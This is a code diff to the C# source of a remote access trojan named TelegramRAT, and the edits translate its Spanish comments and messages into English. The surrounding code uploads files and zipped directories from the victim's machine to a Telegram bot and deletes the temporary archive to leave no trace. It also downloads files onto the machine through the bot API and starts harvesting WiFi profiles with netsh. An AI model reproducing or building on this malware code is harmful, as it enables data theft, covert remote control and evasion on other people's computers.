@@ -82,15 +82,15 @@ namespace TelegramRAT
 
         public static void UploadFile(TelegramAPI tg, string file)
         {
-            // Si el pathname incluye 'username', lo reemplazo por el nombre del usuario actual
+            // Replace 'username' by the actual username
             if (file.Contains("username"))
                 file = file.Replace("username", Environment.UserName);
-            // Me fijo si es un archivo o un directorio
+            // Check if it is a file or a directory
             if (File.Exists(file))
             {
                 FileInfo fileInfo  = new FileInfo(file);
                 string zipTempFile = String.Empty;
-                // Si el archivo es muy grande, lo comprimo y veo si puedo enviarlo
+                // If the file size is too big, try to compress it
                 if (fileInfo.Length > Config.maxFileSize)
                 {
                     string zfile = fileInfo.Name + ".zip";
@@ -106,7 +106,7 @@ namespace TelegramRAT
                         return;
                     }
                     FileInfo zipFileInfo = new FileInfo(zipTempFile);
-                    // El archivo es demasiado grande, incluso comprimido
+                    // File size too big, even compressed
                     if (zipFileInfo.Length > Config.maxFileSize)
                     {
                         tg.SendMessage("The file size is too big!");
@@ -146,7 +146,7 @@ namespace TelegramRAT
                     tg.SendMessage("Sending directory...");
                     tg.SendFile(zDir);
                 }
-                // Borro el archivo para no dejar rastros
+                // Delete file so it doesn't leave a trace
                 File.Delete(zDir);
             }
             else
@@ -167,12 +167,12 @@ namespace TelegramRAT
             if (filePath.Contains("username"))
                 filePath = filePath.Replace("username", Environment.UserName);
             tg.downloadFilePath = filePath;
-            tg.SendMessage("Esperando archivo...");
+            tg.SendMessage("Waiting for file...");
         }
 
         public static async void DownloadFile(TelegramAPI tg, string telegramFilePath)
         {
-            tg.SendMessage("Descargando archivo...");
+            tg.SendMessage("Downloading file...");
             string url = "https://api.telegram.org/file/bot" + Config.TelegramBot_Token + "/" + telegramFilePath;
             // The same client as tg could be used, but we would be breaking encapsulation
             HttpClient client = new HttpClient();
@@ -266,7 +266,7 @@ namespace TelegramRAT
             string arguments = "wlan show profile";
             string wifiProfiles = RunNetsh(tg, arguments);
 
-            // Si está en blanco, hubo un error al correr netsh.exe
+            // If nothing returned, an error has occurred running netsh
             if (wifiProfiles == String.Empty)
                 return;
 
